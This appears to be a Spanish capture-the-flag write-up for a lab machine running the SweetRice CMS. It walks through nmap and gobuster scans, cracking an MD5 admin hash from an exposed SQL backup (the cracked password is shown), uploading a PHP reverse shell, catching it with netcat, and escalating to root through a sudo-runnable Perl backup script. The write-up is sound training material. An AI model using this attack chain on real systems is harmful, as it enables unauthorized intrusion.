# Lazyadmin
---
## fase 1 reconocimiento 
 nmap -Pn -sS -sV --open -vv 10.201.96.143
--
**PORT   STATE SERVICE VERSION**
- 21/tcp open  ftp     vsftpd 3.0.5
- 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
- 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
- Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Hay un puerto 80 abierto, significa que una pagina web esta corriendo 


́Revisamos y solo vemos el predeterminado mensaje de Ubuntu. asi que utilizaremos *Gobuster* para la busqueda de directorios ocultos
 `gobuster dir -u http://10.201.96.143/ -w /usr/share/dirb/wordlists/common.txt`
 
vemos que hay un directorios /content. aqui encontramos la primera pista, utiliza un CMS SweetRice, que es un sistema de gestion de paginas webs 
---
volvemos a utilizar Gobuster para buscar directorios: 
### Directorios encontrados: 
| directorio | estatus | tamaño | redireccion | 
|------------|---------|--------|-------------|
|/.hta       | (Status: 403) | [Size: 278] |
/.htaccess  |          (Status: 403) | [Size: 278] |
/.htpasswd  |          (Status: 403) | [Size: 278] |
/_themes    |          (Status: 301) |[Size: 324] | [--> http://10.201.96.143/content/_themes/] |
/as        |           (Status: 301) |  [Size: 319] | [--> http://10.201.96.143/content/as/] |
/attachment    |       (Status: 301) | [Size: 327] | [--> http://10.201.96.143/content/attachment/] |
/images       |        (Status: 301) | [Size: 323] | [--> http://10.201.96.143/content/images/] |
/inc         |         (Status: 301) | [Size: 320] | [--> http://10.201.96.143/content/inc/] |
/index.php  |          (Status: 200) | [Size: 2199]
/js        |           (Status: 301) | [Size: 319] | [--> http://10.201.96.143/content/js/] |
---
revisamos cada uno y encontramos algo interesante en `/inc` hay un backup sql y con el comnado `curl -O http://10.201.96.143/content/inc/mysql_backup/` lo descargamos. 
Luego utilizamos *grep* para buscar palabras claves en el archivo 

`grep INSERT mysql_bakup_20191129023059-1.5.1.sql`

**Vemos que es ilegible:** 

 *grep INSERT mysql_bakup_20191129023059-1.5.1.sql*
 (```) 14 => 'INSERT INTO %--%_options VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO %--%_options VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO %--%_options VALUES(\'3\',\'links\',\'\',\'1575023409\');',(```)

---
### Asi que utilizaremos el siguiente comando para poder hacerlo un poco mas legible 
`sed 's/INSERT INTO/\\\nINSERT INTO/g; s/),(/),\\\n(/g; s/;/;\\\n/g' mysql_bakup_20191129023059-1.5.1.sql > formatted_sql.sqlsed`

---
Aqui encontramos credenciales, pero la contraseña esta en forma de *hash*

`s:7:\\"manager\\";\`
`s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";\`

---
Utilizaremos **hash-identifier** para saber que tipo de hash es

---
`Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))`

---
### Aqui pueden crackearlo con la herramienta que mas les guste, puede ser con *hash-cat*, *john the ripper*, *Crackstation*. Yo lo hare con Crackstation por gusto personal. 

| hash | type | result | 
|------|------|--------|
| 42f749ade7f9e195bf475f37a44cafcb| md5 | Password123 |

***easy***

# Explotacion web 

---
Anteriormente descubrimos el CMS SweetRice version 1.5.1 que es tiene una vulnerabilidad tipo Arbitrary File Upload.

---
## Subida de payload (Arbitrary File Upload)
---
1. Iniciamos sesión en el panel de administración de **SweetRice** usando las credenciales obtenidas del backup SQL.
2. Navegamos hasta la sección **Ads**, donde encontramos la funcionalidad de subir archivos.
3. Observamos que el sistema permite subir archivos con extensión `.php`. Esto representa una vulnerabilidad del tipo **Arbitrary File Upload**, ya que permite ejecutar código en el servidor.
4. Para probar la vulnerabilidad, subimos un **archivo de prueba** (por ejemplo, un script PHP que muestra “Hello World”) y verificamos que se ejecuta correctamente accediendo a la URL generada.
5. Una vez confirmada la vulnerabilidad, subimos una **reverse shell** de prueba (herramienta: *![PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/tree/master)*) en un entorno de laboratorio autorizado.
6. Localizamos la URL donde se ejecuta la shell subiendo a `/content/as/` y nos aseguramos de que la shell está accesible.
7. Preparamos un **netcat** escuchando en el puerto configurado para recibir la conexión de la reverse shell.
8. Tras obtener la conexión, realizamos un tratamiento básico de TTY para movernos más cómodamente en la terminal:


`python3 -c 'import pty; pty.spawn("/bin/bash")' `

---
### Exploramos el sistema:

- Navegamos a /home/itguy/.

- Listamos archivos y carpetas ocultas con ls -la.

- Encontramos **user.txt** (primera bandera) y **backup.pl**.

- Revisamos el contenido de backup.pl y encontramos un comando que ejecuta un script ubicado en **/etc/copy/.sh**.

- Ajustamos la IP en el script para nuestra máquina y preparamos otra terminal con netcat para recibir la conexión.

## Finalmente, ejecutamos el script como sudo:

`sudo /usr/bin/perl /home/itguy/backup.pl`


# Con esto se completa la fase de explotación y obtenemos una shell con privilegios

